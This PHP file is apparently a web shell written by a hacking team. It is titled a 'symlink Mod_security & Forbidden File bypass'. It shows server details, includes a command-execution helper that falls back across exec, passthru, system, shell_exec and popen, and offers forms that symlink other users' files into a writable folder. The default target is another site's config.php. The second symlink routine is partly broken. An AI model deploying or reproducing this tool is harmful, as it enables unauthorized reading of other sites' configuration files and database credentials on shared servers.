<?php
/**
 * @author Cold z3ro
 * @homepage http://www.hackteach.org/cc/
 * @codename Endoded symlink();
 * @greets to all www.hackteach.org/cc/ members , you are the best || vs xp10.cc 
 * @copyright 2008
 */
?>
<html>

<head>
<title>H-Teach Team http://www.hackteach.org</title>
</head>

<body bgcolor="#800000">
<?php
// some functions

//start H4ckT3ach Team
if  (empty($_POST['H4ckT3ach'] ) ) {
	}ELSE{
	$action = '?action=H4ckT3ach';
	echo '<table Width="100%" height="10%" bgcolor="#000000" border="1"><tr><td><center>
  <table border="0" cellpadding="0" cellspacing="0" style="border-collapse: collapse; border-style: dotted" bordercolor="#FFFFFF" width="100%" id="AutoNumber1">
    <tr>
      <td width="100%" colspan="5">
      <p align="center"><font color="#800000" size="7">Hack Teach Team</font></td>
    </tr>
    <tr>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      <p align="center">HcJ</td>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      Ameer Elshouq</td>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      The Big Hackerz</td>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      ***Matrix***</td>
      <td width="20%" style="font-family: (1)Fonts44-Net; font-size: 14pt; font-weight: bold; color: #FFFFFF; border-style: dotted; border-width: 1" align="center" bordercolor="#FFFFFF">
      Cold z3ro</td>
    </tr>
    <tr>
      <td width="20%" style="border-style: dotted; border-width: 1" bordercolor="#FFFFFF">&nbsp;</td>
      <td width="60%" colspan="3" style="border-style: dotted; border-width: 1" bordercolor="#FFFFFF">
      <p align="center"><font color="#FFFFFF">
      <a href="http://www.hackteach.org"><font color="#FFFFFF">
      http://www.hackteach.org</font></a> || <a href="http://www.hack.ps">
      <font color="#FFFFFF">http://www.hack.ps</font></a> ||
      <a href="http://www.hackteach.net"><font color="#FFFFFF">
      http://www.hackteach.net</font></a> </font></td>
      <td width="20%" style="border-style: dotted; border-width: 1" bordercolor="#FFFFFF">&nbsp;</td>
    </tr>
  </table>
</table>';
exit;
}
//
//phpinfo
if (empty($_POST['phpinfo'] )) {
	}else{
	echo $phpinfo=(!eregi("phpinfo",$dis_func)) ? phpinfo() : "phpinfo()";
	exit;
}
//
// encode/decode
//
// uname
function getsystem()
{return php_uname('s')." ".php_uname('r')." ".php_uname('v');}; 
//
//safemode
function safe_mode(){
if(!$safe_mode && strpos(ex("echo abch0ld"),"h0ld")!=3){$_SESSION['safe_mode'] = 1;return "<b><font color=#800000 face=Verdana>ON</font></b>";}else{   $_SESSION['safe_mode'] = 0;return "<font color=#008000><b>OFF</b></font>";}
};function ex($in){
$out = '';
if(function_exists('exec')){exec($in,$out);$out = join("\n",$out);}elseif(function_exists('passthru')){ob_start();passthru($in);$out = ob_get_contents();ob_end_clean();}
elseif(function_exists('system')){ob_start();system($in);$out = ob_get_contents();ob_end_clean();}
elseif(function_exists('shell_exec')){$out = shell_exec($in);}
elseif(is_resource($f = popen($in,"r"))){$out = "";while(!@feof($f)) { $out .= fread($f,1024);}
pclose($f);}
return $out;}
//

function one()
{
	$pwd = getcwd();
	$v = base64_encode($_POST['vpath']);
	$he = base64_decode($v);
	$m = base64_encode($_POST['mpath']);
	$me = base64_decode($m);
	$file = basename($he,".php");

	if (empty($_POST['path'])){	} else {
	
 	 if (@symlink("$he","$me/$file.sup")){
 	
	 	is_file("".$pwd."/".$file.".sup");
 	
		echo 'Your File name is <a href="'.$file.'.sup">'.$file.'.sup</a>';
	
		} else {
	
		echo 'Cant symlink <font color="#FF0000">'.$he.'</font> make sure it exists,<br> OR <font color="#00CC00">'.$file.'.sup</font> is exist in <font color="#FF0000">'.$pwd.'</font>';
	
	  }
	}
}

function two()
{
	$pwd = getcwd();
	$he2 = base64_decode($_POST['v2path']);
	$me2 = base64_decode($_POST['m2path']);
	$file2 = basename($he,".php");

	if (empty($_POST['p2ath'])){	} else {
	
	 if (@symlink("$he","$me/$file.sup")){
 	
	 	is_file("".$pwd."/".$file2.".sup");
 	
		echo 'Your File name is <a href="'.$file2.'.sup">'.$file2.'.sup</a>';
	
	} else {
	
		echo 'Cant symlink <font color="#FF0000">'.$he2.'</font> make sure it exists,<br> OR <font color="#00CC00">'.$file2.'.sup</font> is exist in <font color="#FF0000">'.$pwd.'</font>';
	
	  }
  
	}
}
?>

<div align="center">
  <center>

<table border="0" cellpadding="0" cellspacing="0" bordercolor="#111111" width="68%" id="AutoNumber1" bgcolor="#000000" height="416">
  <tr>
    <td width="100%" height="250">
    <p align="center">
    <img border="0" src="http://hackteach.net/apps/old/images/z3ro_01.gif" width="777" height="232"></td>
  </tr>
  <tr>
    <td width="100%" height="91" bgcolor="#8B8B8B">
    <p align="center"><font size="6"><font color="#FFFFFF">symlink();</font> 
    Mod_security &amp; Forbidden File bypass</font></td>
  </tr>
  <tr>
    <td width="100%" height="43">

    <table border="1" cellpadding="0" cellspacing="0" bordercolor="#FFFFFF" width="100%" id="AutoNumber2" bgcolor="#8B8B8B" style="border-collapse: collapse">
      <tr>
        <td width="100%" bgcolor="#000000"><?
if (!isset($_GET['action']) OR empty($_GET['action'])) {
	 echo "<FORM method='POST' action='$REQUEST_URI' enctype='multipart/form-data'>";
	 echo "<p align='center'><INPUT type='submit'name='H4ckT3ach' value='H-teach' id=input1> <INPUT type='submit' name='phpinfo' value='PHPinfo' id=input>";}?></form>&nbsp;</td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" dir="ltr">UNM : <?php echo getsystem();?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" dir="ltr">PWD : <?php echo getcwd();?></td>
      </tr>
      <tr>
        <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" dir="ltr">SM. : <?php echo safe_mode();?></td>
      </tr>
    </table>

    </td>
  </tr>
  <tr>
    <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13"></td>
  </tr>
  <tr>
    <td width="100%" height="1" bgcolor="#808080">
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%">
  <tr>
    <td width="50%" align="center">
    	<form method="GET">
		<font color="#FFFFFF">Try The First Way : </font>
		<input type="submit" name="one" value="Try">
		</form>
    </td>
    <td width="50%" align="center">
    	<form method="GET">
		<font color="#FFFFFF">Try The Second Way :
		<input type="submit" name="two" value="Try"> </font>
		</form>
    </td>
  </tr>
</table>
<?

if (!empty($_GET['one'])){ ?>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%">
  <tr>
    <td width="50%" align="center">
	<form method="POST">
	<font color="#FFFFFF">File Path<br>
	</font>
	<input type="text" name="vpath" value="/home/user/www/includes/config.php" size="45"><br>
	<font color="#FFFFFF">777 Folder Path</font><br>
	<input type="text" name="mpath" value="<?php echo getcwd(); ?>" size="45"><br>
	<input type="submit" name="path" value="symlink">
	</form>
   </td>
  </tr>
</table>

<?
	htmlspecialchars(one());
}
if (!empty($_GET['two'])){ ?>
<table border="1" cellpadding="0" cellspacing="0" style="border-collapse: collapse" bordercolor="#111111" width="100%">
  <tr>
    <td width="50%" align="center">
	<form method="POST">
	<font color="#FFFFFF">File Path Encoded with base64<br>
	<input type="text" name="v2path" value="L2hvbWUvdXNlci93d3cvaW5jbHVkZXMvY29uZmlnLnBocA==" size="45"><br>
	777 Folder Path<br>
	<input type="text" name="m2path" value="<?php echo getcwd(); ?>" size="45"><br>
	<input type="submit" name="p2ath" value="symlink"> </font>
	</form>
   </td>
  </tr>
</table>
<?
	htmlspecialchars(two());
}
?>
</td>
  </tr>
  <tr>
    <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13"></td>
  </tr>
  <tr>
    <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13">
    <p align="center"><font size="3">greets to members of </font> <a href="http://www.hackteach.org/cc">
    <font size="3" color="#8B8B8B">www.hackteach.org/cc</font></a></td>
  </tr>
  <tr>
    <td width="100%" style="font-family: (1)Fonts44-Net; color: #FFFFFF; font-size: 8pt; font-weight: bold" height="13">
    <p align="center"> <font size="2">Cod[3]d By Cold z3ro</font></td>
  </tr>
</table>

  </center>
</div>

</body>

</html>